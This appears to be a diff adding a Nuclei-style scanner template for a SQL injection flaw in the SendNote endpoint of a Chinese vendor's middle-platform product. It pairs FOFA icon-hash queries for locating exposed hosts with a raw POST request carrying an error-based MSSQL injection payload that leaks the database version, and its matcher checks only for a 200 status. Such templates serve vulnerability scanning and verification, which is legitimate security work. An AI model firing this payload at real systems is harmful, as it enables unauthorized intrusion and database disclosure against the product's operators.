@@ -1,0 +1,30 @@
+id: poc-lm5ckfqd2l3br6i7
+info:
+  name: 山东聚恒网络技术有限公司聚恒中台SendNote存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/lm5ckfqd2l3br6i7'
+  tags: sqli,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: lm5ckfqd2l3br6i7
+    fofa: icon_hash="-2049533275" || icon_hash="-737808640" || icon_hash="-1557056363"
+http:
+- raw:
+  - 'POST /sysplat/dataget/data.ashx?type=SendNote HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36
+
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+    Connection: close
+
+
+    noteid=1'' and 1=(convert(int,@@version))--'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
